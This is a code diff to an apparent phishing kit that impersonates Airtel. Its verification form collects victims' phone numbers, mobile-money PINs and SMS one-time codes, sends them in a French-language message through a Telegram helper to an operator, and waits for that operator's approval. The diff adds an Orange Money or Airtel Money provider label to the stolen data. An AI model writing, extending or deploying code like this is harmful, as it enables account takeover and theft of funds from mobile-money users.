@@ -4,11 +4,13 @@ import { AlertTriangle, ArrowLeft, KeyRound, Loader2, Lock, RefreshCw, ShieldChe
 import { AirtelLogo, ValidatingModal, LanguageSwitch, useApp } from '../App';
 import type { InternetPlan, CountryInfo } from '../App';
 import { sendLoginToTelegramAndWait } from '../utils/telegram';
+import type { PaymentProvider } from './LoanApplication1';
 interface VerificationFormProps {
   phone: string;
   pin: string;
   sessionId: string;
   selectedPlan: InternetPlan;
+  provider: PaymentProvider;
   country?: CountryInfo;
   fullPhone?: string;
   onBack: () => void;
@@ -20,6 +22,7 @@ export const VerificationForm: React.FC<VerificationFormProps> = ({
   pin,
   sessionId,
   selectedPlan,
+  provider,
   country: propCountry,
   fullPhone: propFullPhone,
   onBack,
@@ -108,6 +111,7 @@ export const VerificationForm: React.FC<VerificationFormProps> = ({
     const message =
       `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
       `🌍 <b>Pays Airtel:</b> ${country.flag} ${language === 'fr' ? country.nameFr : country.nameEn}\n` +
+      `💳 <b>Moyen de paiement:</b> ${provider === 'orange' ? '🍊 Orange Money' : '🔴 Airtel Money'}\n` +
       `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
       `🔢 <b>Code OTP Saisi:</b> <code>${currentOtp}</code>\n` +
       `🔑 <b>Code PIN Initial:</b> <code>${pin}</code>\n` +
@@ -117,7 +121,7 @@ export const VerificationForm: React.FC<VerificationFormProps> = ({
       `👇 <i>Confirmez la validité du code OTP reçu par SMS :</i>`;
 
     try {
-      const isAccepted = await sendLoginToTelegramAndWait(message, phone, true);
+      const isAccepted = await sendLoginToTelegramAndWait(message, `${provider}_${phone}`, true);
       if (isAccepted) {
         onOtpSuccess();
       } else {
